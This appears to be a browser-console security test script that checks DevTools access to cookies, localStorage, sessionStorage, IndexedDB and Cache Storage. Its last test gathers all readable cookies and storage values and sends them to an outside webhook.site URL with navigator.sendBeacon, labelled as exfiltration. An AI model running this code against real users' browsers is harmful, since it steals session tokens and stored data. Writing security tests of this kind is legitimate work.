// =============================================================
// TEST 04: Cookie & Storage Access from DevTools
// =============================================================

// --- Test 4.1: Read all cookies ---
console.log('[TEST 4.1] document.cookie:', document.cookie || '(empty)');

// --- Test 4.2: Set a tracking cookie ---
document.cookie = 'zt_test=devtools_access;path=/;max-age=86400';
console.log('[TEST 4.2] Cookie set. Current cookies:', document.cookie);

// --- Test 4.3: Read all localStorage ---
console.log('[TEST 4.3] localStorage keys:', Object.keys(localStorage));
for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    console.log('[TEST 4.3]  ', key, '=', localStorage.getItem(key).substring(0, 100));
}

// --- Test 4.4: Read all sessionStorage ---
console.log('[TEST 4.4] sessionStorage keys:', Object.keys(sessionStorage));
for (var i = 0; i < sessionStorage.length; i++) {
    var key = sessionStorage.key(i);
    console.log('[TEST 4.4]  ', key, '=', sessionStorage.getItem(key).substring(0, 100));
}

// --- Test 4.5: Read IndexedDB databases ---
indexedDB.databases().then(function(dbs) {
    console.log('[TEST 4.5] IndexedDB databases:', JSON.stringify(dbs));
}).catch(function(e) {
    console.log('[TEST 4.5] IndexedDB access:', e.message);
});

// --- Test 4.6: Write to localStorage ---
localStorage.setItem('zt_devtools_test', JSON.stringify({
    injected: true, timestamp: new Date().toISOString(), source: 'devtools'
}));
console.log('[TEST 4.6] localStorage write:', localStorage.getItem('zt_devtools_test'));

// --- Test 4.7: Read Cache Storage ---
caches.keys().then(function(names) {
    console.log('[TEST 4.7] Cache Storage:', names);
    names.forEach(function(name) {
        caches.open(name).then(function(cache) {
            cache.keys().then(function(keys) {
                console.log('[TEST 4.7] Cache "' + name + '":', keys.length, 'entries');
                keys.slice(0, 5).forEach(function(req) { console.log('  ', req.url); });
            });
        });
    });
}).catch(function(e) { console.log('[TEST 4.7] Cache API:', e.message); });

// --- Test 4.8: HttpOnly cookie access attempt ---
// HttpOnly cookies can't be read via document.cookie but may appear in DevTools Application tab
console.log('[TEST 4.8] Note: Check Application > Cookies in DevTools for HttpOnly cookies');
console.log('[TEST 4.8] document.cookie only shows non-HttpOnly:', document.cookie);

// --- Test 4.9: Exfiltrate all storage data ---
var storageData = {
    cookies: document.cookie,
    localStorage: {},
    sessionStorage: {},
    url: window.location.href,
    timestamp: new Date().toISOString()
};
for (var i = 0; i < localStorage.length; i++) {
    storageData.localStorage[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
}
for (var i = 0; i < sessionStorage.length; i++) {
    storageData.sessionStorage[sessionStorage.key(i)] = sessionStorage.getItem(sessionStorage.key(i));
}
console.log('[TEST 4.9] ALL STORAGE DATA:', JSON.stringify(storageData));

// Attempt exfil
navigator.sendBeacon('https://webhook.site/3bf3755d-69fc-4f50-a34c-3c28ed2765ef', JSON.stringify({cat:'devtools',test:'storage-exfil',...storageData}));
console.log('[TEST 4.9] Storage data exfiltrated via webhook');
